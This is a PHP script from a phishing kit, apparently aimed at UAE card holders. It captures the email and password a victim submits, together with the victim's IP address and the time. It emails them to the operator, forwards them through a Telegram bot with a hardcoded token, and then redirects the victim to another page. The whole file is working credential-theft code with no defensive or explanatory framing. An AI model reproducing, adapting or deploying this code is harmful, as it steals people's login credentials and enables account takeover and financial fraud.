<?php
include("../config/Sys.php");
include "../config/n8.php";
$date = date('m/d/Y h:i:s a', time());
$ip = getenv("REMOTE_ADDR");
$link = $_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'] ;
if(($_POST['email'] != "") )
{
$hostname = gethostbyaddr($ip);
$message .= "+-------------------+\n";
$message .= "* email : ".$_POST['email']."\n";
$message .= "* password : ".$_POST['password']."\n";
$message .= "* IP   : $ip\n";
$message .= "* OS   : $user_os\n";
$message .= "* TIME : $date\n";
$message .= "* SUM  : $user_browser\n";
$message .= "+-------------------+\n";
$send = "$jean_email";
$subject = "UAE CARD SMS  [".$_POST['jeansms']."]";
$headers = "From: ".$_POST['jeansms']." <uae@jeann8.com>";
mail($send,$subject,$message,$headers);
$token ='2033828112:AAEyRWoh1vAvnGYg_zz8Y53uxwzFLeMDAPQ';
$data = [
    'text' => $message,
    'chat_id' => $chat_id,
];

file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data) );


	$infos = "[⚠️] SMS PAGE 2 ON WAY 15 sec";
	$token ='2033828112:AAEyRWoh1vAvnGYg_zz8Y53uxwzFLeMDAPQ';
    $data = [
    'text' => $infos,
    'chat_id' => $chat_id,
];

file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data) );
}


header("Location: ../online.php");

?>